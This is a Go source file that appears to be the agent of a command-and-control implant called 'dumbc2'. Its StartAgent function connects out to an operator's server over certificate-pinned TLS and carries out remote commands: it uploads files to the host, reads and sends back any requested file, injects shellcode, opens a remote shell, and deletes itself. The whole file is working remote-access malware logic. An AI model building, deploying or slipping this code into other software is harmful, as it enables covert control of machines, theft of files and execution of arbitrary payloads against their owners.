package useri

import (
	"bytes"
	"encoding/base64"
	"github.com/kmahyyg/dumbc2/buildtime"
	"github.com/kmahyyg/dumbc2/config"
	"github.com/kmahyyg/dumbc2/remoteop"
	"github.com/kmahyyg/dumbc2/transport"
	"io"
	"io/ioutil"
	"log"
	"net"
	"time"
)

func StartAgent(userOP *config.UserOperation) {
	servFGP := make([]byte, base64.StdEncoding.DecodedLen(len(buildtime.RemoteFingerprint)))
	_, err := base64.StdEncoding.Decode(servFGP, buildtime.RemoteFingerprint)
	if err != nil {
		log.Fatalln("Server Pinned Key Error.")
	}
	var errCounter = 0
	var buf bytes.Buffer
	var curConn net.Conn
	var pbb *remoteop.PingBack
	for {
		if errCounter >= 3 {
			return
		}
		curConn, err = transport.TLSDialer(servFGP, buildtime.ClientCertificatePEM, buildtime.ClientCertificateKey, buildtime.CACertificate, userOP.ListenAddr)
		if err != nil {
			errCounter++
			log.Println(err)
			time.Sleep(1 * time.Minute)
		} else {
			break
		}
	}
	errCounter = 0
	sendSuccess := func() {
		pbb = &remoteop.PingBack{
			StatusCode: remoteop.StatusOK,
			DataLength: 0,
			DataPart:   []byte{0},
		}
		_ = pbb.BuildnSend(curConn)
	}
	sendFailed := func() {
		pbb = &remoteop.PingBack{
			StatusCode: remoteop.StatusFailed,
			DataLength: 0,
			DataPart:   []byte{0},
		}
		_ = pbb.BuildnSend(curConn)
	}
	for {
		if errCounter > 5 {
			return
		}
		buf.Reset()
		_, err = io.Copy(&buf, curConn)
		if err != nil {
			errCounter++
			log.Println(err)
			time.Sleep(10 * time.Second)
			continue
		}
		if buf.Len() > 5 {
			curRtCmd, err := remoteop.ParseIncomingRTCmd(buf.Bytes())
			if err != nil || curRtCmd == nil {
				log.Fatalln("Error when Parsing Incoming RTCMD.")
			}
			if bytes.Equal(curRtCmd.Command, []byte(selfDestroyCmd)) {
				remoteop.DeleteMyself()
				sendSuccess()
				_ = curConn.Close()
				return
			} else if bytes.Equal(curRtCmd.Command, []byte(uploadCmd)) {
				if curRtCmd.HasData == byte(0) || len(curRtCmd.RealData) < 1 || len(curRtCmd.FilePathRemote) < 2 {
					log.Println("Remote Data Received, but seems built in an illegal way.")
				}
				err := ioutil.WriteFile(string(curRtCmd.FilePathRemote), curRtCmd.RealData, 0644)
				if err != nil {
					log.Println(err)
				}
				sendSuccess()
			} else if bytes.Equal(curRtCmd.Command, []byte(downloadCmd)) {
				fddt, err := ioutil.ReadFile(string(curRtCmd.FilePathRemote))
				if len(fddt) == 0 || fddt == nil || err != nil {
					log.Println("Failed to read original data.")
					sendFailed()
					continue
				}
				fdlen := (len(fddt) / 1048576) + 1
				if fdlen > 254 || fdlen < 1 {
					log.Println("Internal Error: File too large.")
					sendFailed()
					continue
				}
				pbb = &remoteop.PingBack{
					StatusCode: remoteop.StatusOK,
					DataLength: byte(fdlen),
					DataPart:   fddt,
				}
				err = pbb.BuildnSend(curConn)
				if err != nil {
					log.Println(err)
					sendFailed()
					continue
				}
				sendSuccess()
			} else if bytes.Equal(curRtCmd.Command, []byte(injectShellCodeCmd)){
				if curRtCmd.HasData != byte(1) {
					log.Fatalln("Internal Error.")
				}
				remoteop.InjectShellcode(string(curRtCmd.RealData))
				sendSuccess()
			} else if bytes.Equal(curRtCmd.Command, []byte(getShellCmd)){
				// no ping-back send out.
				remoteop.GetShell(curConn)
				continue
			} else {
				log.Fatalln("Error when trying to find valid commands from remote.")
			}
		}
	}
}
